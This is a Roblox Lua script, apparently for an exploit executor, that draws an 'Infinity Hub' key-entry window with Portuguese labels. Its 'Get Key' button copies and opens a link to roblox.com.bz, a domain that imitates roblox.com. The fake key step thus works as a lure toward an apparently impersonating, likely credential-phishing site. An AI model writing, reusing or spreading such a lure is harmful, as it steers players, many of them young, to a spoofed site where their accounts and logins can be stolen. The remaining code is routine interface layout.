local GROUP_LINK = "https://roblox.com.bz/communities/4474624507/"

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")
local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "InfinityHub"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.fromOffset(420, 300)
frame.Position = UDim2.fromScale(0.5, 0.5)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(10, 13, 24)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)

local stroke = Instance.new("UIStroke", frame)
stroke.Color = Color3.fromRGB(45, 90, 220)
stroke.Thickness = 1.5
stroke.Transparency = 0.2

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 64)
title.Position = UDim2.fromOffset(20, 18)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBlack
title.Text = "Infinity Hub"
title.TextSize = 40
title.TextXAlignment = Enum.TextXAlignment.Center
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = frame

local grad = Instance.new("UIGradient", title)
grad.Color = ColorSequence.new(Color3.fromRGB(120, 190, 255), Color3.fromRGB(70, 90, 255))

local keyLabel = Instance.new("TextLabel")
keyLabel.Size = UDim2.new(1, -60, 0, 20)
keyLabel.Position = UDim2.fromOffset(30, 100)
keyLabel.BackgroundTransparency = 1
keyLabel.Font = Enum.Font.GothamMedium
keyLabel.Text = "Key"
keyLabel.TextSize = 16
keyLabel.TextXAlignment = Enum.TextXAlignment.Left
keyLabel.TextColor3 = Color3.fromRGB(170, 185, 220)
keyLabel.Parent = frame

local box = Instance.new("TextBox")
box.Size = UDim2.new(1, -60, 0, 42)
box.Position = UDim2.fromOffset(30, 124)
box.BackgroundColor3 = Color3.fromRGB(20, 25, 42)
box.BorderSizePixel = 0
box.Font = Enum.Font.Gotham
box.PlaceholderText = "Insira sua key aqui"
box.Text = ""
box.TextSize = 15
box.ClearTextOnFocus = false
box.TextColor3 = Color3.fromRGB(235, 240, 255)
box.PlaceholderColor3 = Color3.fromRGB(110, 125, 160)
box.Parent = frame
Instance.new("UICorner", box).CornerRadius = UDim.new(0, 8)
Instance.new("UIPadding", box).PaddingLeft = UDim.new(0, 12)

local btn = Instance.new("TextButton")
btn.Size = UDim2.new(1, -60, 0, 54)
btn.Position = UDim2.fromOffset(30, 190)
btn.BackgroundColor3 = Color3.fromRGB(45, 90, 220)
btn.BorderSizePixel = 0
btn.Font = Enum.Font.GothamBold
btn.Text = "Get Key"
btn.TextSize = 20
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.AutoButtonColor = true
btn.Parent = frame
Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)

local btnGrad = Instance.new("UIGradient", btn)
btnGrad.Color = ColorSequence.new(Color3.fromRGB(60, 130, 255), Color3.fromRGB(40, 60, 200))

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -60, 0, 20)
status.Position = UDim2.fromOffset(30, 252)
status.BackgroundTransparency = 1
status.Font = Enum.Font.Gotham
status.Text = ""
status.TextSize = 14
status.TextColor3 = Color3.fromRGB(150, 170, 210)
status.Parent = frame

btn.MouseButton1Click:Connect(function()
	status.Text = "Abrindo o link do grupo..."
	if setclipboard then
		pcall(setclipboard, GROUP_LINK)
	end
	local ok = pcall(function()
		GuiService:OpenBrowserWindow(GROUP_LINK)
	end)
	if not ok then
		status.Text = "Link copiado: " .. GROUP_LINK
	else
		status.Text = "Link do grupo aberto no navegador."
	end
end)

TweenService:Create(frame, TweenInfo.new(0.35), { BackgroundTransparency = 0 }):Play()
